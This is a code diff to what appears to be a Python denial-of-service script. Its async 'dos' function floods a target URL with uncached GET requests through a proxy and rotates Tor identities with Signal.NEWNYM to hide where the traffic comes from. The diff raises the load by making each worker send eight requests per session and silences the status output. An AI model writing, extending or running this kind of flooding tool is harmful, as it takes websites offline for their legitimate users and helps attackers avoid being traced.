@@ -15,7 +15,10 @@ import argparse
 import re
 
 
-__all__ = ['URL', 'PROXY_HOST', 'PROXY_PORT', 'WORKERS', 'dos', 'runner', 'pool']
+__all__ = [
+    'URL', 'PROXY_HOST', 'PROXY_PORT',
+    'WORKERS', 'dos', 'runner', 'pool'
+]
 
 
 PROTOCOL_PATTERN = '^(?:https?:\/\/)?(?:www\.)?'
@@ -51,9 +54,11 @@ async def dos(url: str, proxy_host: str, proxy_port: str, worker: int):
             'Expires': '0'
         }
 
-        async with session.get(url, headers=headers) as response:
-            # To check the IP add made through `await response.text()` and use the default URK
-            print(f'#{worker + 1} Worker | Request to {re.sub(PROTOCOL_PATTERN, "", url)} has a {response.status} status code') 
+        for index in range(8):
+            async with session.get(url, headers=headers) as response:
+                # print(f'#{worker + 1} Worker | Request to {re.sub(PROTOCOL_PATTERN, "", url)} has a {response.status} status code (IP await {response.text()})')
+                
+                ...
 
         await session.close()
 
@@ -62,6 +67,8 @@ async def dos(url: str, proxy_host: str, proxy_port: str, worker: int):
             controller.authenticate()
 
             controller.signal(Signal.NEWNYM)
+
+            # print(f'{worker + 1} Worker | New identity')
 
 
 def runner(args: argparse.Namespace, loop: asyncio.unix_events._UnixSelectorEventLoop, worker: int):
